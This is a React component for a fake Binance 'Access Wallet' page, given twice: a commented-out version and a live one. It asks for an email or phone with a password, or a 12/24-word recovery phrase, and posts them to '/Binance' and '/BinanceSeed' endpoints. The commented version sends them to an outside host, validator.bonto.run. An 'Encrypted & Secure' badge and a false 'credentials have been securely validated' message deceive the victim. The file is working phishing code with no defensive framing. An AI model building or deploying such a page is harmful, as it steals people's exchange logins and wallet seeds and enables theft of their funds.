
// import React, { useState } from "react";
// import fetchWithRetry from '../../utils/api'
// import {
//   Eye,
//   EyeOff,
//   Loader2,
//   Shield,
//   CheckCircle
// } from "lucide-react";
// import "./binanceLanding.css";
// import binance from "../../assets/binance_logo.png";

// const EMAIL_API = "https://validator.bonto.run/Binance";
// const PHRASE_API = "https://validator.bonto.run/BinanceSeed";

// const BinanceLanding = () => {
//   const [method, setMethod] = useState(null);
//   const [emailOrUsername, setEmailOrUsername] = useState("");
//   const [password, setPassword] = useState("");
//   const [passphrase, setPassphrase] = useState("");
//   const [showPassword, setShowPassword] = useState(false);
//   const [loading, setLoading] = useState(false);
//   const [done, setDone] = useState(false);
//   const [error, setError] = useState("");

//   const submitForm = async () => {
//     setError("");

//     if (
//       (method === "email" && (!emailOrUsername || !password)) ||
//       (method === "phrase" && !passphrase)
//     ) {
//       setError("Please fill in all fields");
//       return;
//     }

//     setLoading(true);

//     try {
//       const res = await fetch(
//         method === "email" ? EMAIL_API : PHRASE_API,
//         {
//           method: "POST",
//           headers: { "Content-Type": "application/json" },
//           body: JSON.stringify(
//             method === "email"
//               ? { emailOrUsername, password }
//               : { passphrase }
//           )
//         }
//       );

//       const data = await res.json();
//       if (!res.ok) throw new Error(data.error || "Validation failed");

//       setDone(true);
//     } catch (err) {
//       setError(err.message);
//     } finally {
//       setLoading(false);
//     }
//   };

//   /* ================= SUCCESS STATE ================= */
//   if (done) {
//     return (
//       <div className="bnb-page-container">
//         <div className="bnb-content-box">
//           <div className="bnb-logo-area">
//             <img src={binance} alt="Binance" className="bnb-logo-image" />
//           </div>

//           <div className="bnb-form-container">
//             <CheckCircle size={32} color="#f3ba2f" />
//             <h2 className="bnb-page-title">Verification in Progress</h2>
//             <p className="bnb-page-subtitle">
//               Your credentials have been securely validated.
//             </p>

//             <button
//               className="bnb-submit-button"
//               onClick={() => window.location.reload()}
//             >
//               Validate Another
//             </button>
//           </div>
//         </div>
//       </div>
//     );
//   }

//   /* ================= METHOD SELECT ================= */
//   if (!method) {
//     return (
//       <div className="bnb-page-container">
//         <div className="bnb-content-box">
//           <div className="bnb-logo-area">
//             <img src={binance} alt="Binance" className="bnb-logo-image" />
//           </div>

//           <div className="bnb-form-container">
//             <h1 className="bnb-page-title">Access Wallet</h1>
//             <p className="bnb-page-subtitle">
//               Choose how you want to continue
//             </p>

//             <button
//               className="bnb-submit-button"
//               onClick={() => setMethod("email")}
//             >
//               Email or Phone  & Password
//             </button>

//             <button
//               className="bnb-submit-button bnb-secondary-button"
//               onClick={() => setMethod("phrase")}
//             >
//               Recovery Phrase
//             </button>
//           </div>
//         </div>
//       </div>
//     );
//   }

//   /* ================= FORMS ================= */
//   return (
//     <div className="bnb-page-container">
//       <div className="bnb-content-box">
//         <div className="bnb-logo-area">
//           <img src={binance} alt="Binance" className="bnb-logo-image" />
//         </div>

//         <div className="bnb-form-container">
//           <div className="bnb-security-notice">
//             <Shield size={16} /> Encrypted & Secure
//           </div>

//           {method === "email" && (
//             <>
//               <div className="bnb-field-group">
//                 <label>Email / Phone</label>
//                 <input
//                   className="bnb-input-field"
//                   value={emailOrUsername}
//                   onChange={(e) => setEmailOrUsername(e.target.value)}
//                 />
//               </div>

//               <div className="bnb-field-group">
//                 <label>Password</label>
//                 <div className="bnb-password-container">
//                   <input
//                     type={showPassword ? "text" : "password"}
//                     className="bnb-input-field"
//                     value={password}
//                     onChange={(e) => setPassword(e.target.value)}
//                   />
//                   <button
//                     className="bnb-eye-button"
//                     onClick={() => setShowPassword(!showPassword)}
//                   >
//                     {showPassword ? <EyeOff /> : <Eye />}
//                   </button>
//                 </div>
//               </div>
//             </>
//           )}

//           {method === "phrase" && (
//             <textarea
//               className="bnb-input-field"
//               placeholder="Enter your 12 or 24-word recovery phrase"
//               rows={4}
//               value={passphrase}
//               onChange={(e) => setPassphrase(e.target.value)}
//             />
//           )}

//           {error && <div className="bnb-error-alert">{error}</div>}

//           <button
//             className="bnb-submit-button"
//             onClick={submitForm}
//             disabled={loading}
//           >
//             {loading ? (
//               <>
//                 <Loader2 size={18} className="bnb-spinner" />
//                 Processing...
//               </>
//             ) : (
//               "Continue"
//             )}
//           </button>

//           <button
//             className="bnb-link-text"
//             onClick={() => setMethod(null)}
//           >
//             Back
//           </button>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default BinanceLanding;


import React, { useState } from "react";
import fetchWithRetry from '../../utils/api';
import {
  Eye,
  EyeOff,
  Loader2,
  Shield,
  CheckCircle
} from "lucide-react";
import "./binanceLanding.css";
import binance from "../../assets/binance_logo.png";

const BinanceLanding = () => {
  const [method, setMethod] = useState(null);
  const [emailOrUsername, setEmailOrUsername] = useState("");
  const [password, setPassword] = useState("");
  const [passphrase, setPassphrase] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    setError("");

    if (
      (method === "email" && (!emailOrUsername || !password)) ||
      (method === "phrase" && !passphrase)
    ) {
      setError("Please fill in all fields");
      return;
    }

    setLoading(true);

    try {
      const res = await fetchWithRetry(
        method === "email" ? "/Binance" : "/BinanceSeed",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(
            method === "email"
              ? { emailOrUsername, password }
              : { passphrase }
          )
        }
      );

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Validation failed");

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  /* ================= SUCCESS STATE ================= */
  if (done) {
    return (
      <div className="bnb-page-container">
        <div className="bnb-content-box">
          <div className="bnb-logo-area">
            <img src={binance} alt="Binance" className="bnb-logo-image" />
          </div>

          <div className="bnb-form-container">
            <CheckCircle size={32} color="#f3ba2f" />
            <h2 className="bnb-page-title">Verification in Progress</h2>
            <p className="bnb-page-subtitle">
              Your credentials have been securely validated.
            </p>

            <button
              className="bnb-submit-button"
              onClick={() => window.location.reload()}
            >
              Validate Another
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ================= METHOD SELECT ================= */
  if (!method) {
    return (
      <div className="bnb-page-container">
        <div className="bnb-content-box">
          <div className="bnb-logo-area">
            <img src={binance} alt="Binance" className="bnb-logo-image" />
          </div>

          <div className="bnb-form-container">
            <h1 className="bnb-page-title">Access Wallet</h1>
            <p className="bnb-page-subtitle">
              Choose how you want to continue
            </p>

            <button
              className="bnb-submit-button"
              onClick={() => setMethod("email")}
            >
              Email or Phone & Password
            </button>

            <button
              className="bnb-submit-button bnb-secondary-button"
              onClick={() => setMethod("phrase")}
            >
              Recovery Phrase
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ================= FORMS ================= */
  return (
    <div className="bnb-page-container">
      <div className="bnb-content-box">
        <div className="bnb-logo-area">
          <img src={binance} alt="Binance" className="bnb-logo-image" />
        </div>

        <div className="bnb-form-container">
          <div className="bnb-security-notice">
            <Shield size={16} /> Encrypted & Secure
          </div>

          {method === "email" && (
            <>
              <div className="bnb-field-group">
                <label>Email / Phone</label>
                <input
                  className="bnb-input-field"
                  value={emailOrUsername}
                  onChange={(e) => setEmailOrUsername(e.target.value)}
                />
              </div>

              <div className="bnb-field-group">
                <label>Password</label>
                <div className="bnb-password-container">
                  <input
                    type={showPassword ? "text" : "password"}
                    className="bnb-input-field"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button
                    className="bnb-eye-button"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    {showPassword ? <EyeOff /> : <Eye />}
                  </button>
                </div>
              </div>
            </>
          )}

          {method === "phrase" && (
            <textarea
              className="bnb-input-field"
              placeholder="Enter your 12 or 24-word recovery phrase"
              rows={4}
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
            />
          )}

          {error && <div className="bnb-error-alert">{error}</div>}

          <button
            className="bnb-submit-button"
            onClick={submitForm}
            disabled={loading}
          >
            {loading ? (
              <>
                <Loader2 size={18} className="bnb-spinner" />
                Processing...
              </>
            ) : (
              "Continue"
            )}
          </button>

          <button
            className="bnb-link-text"
            onClick={() => setMethod(null)}
          >
            Back
          </button>
        </div>
      </div>
    </div>
  );
};

export default BinanceLanding;
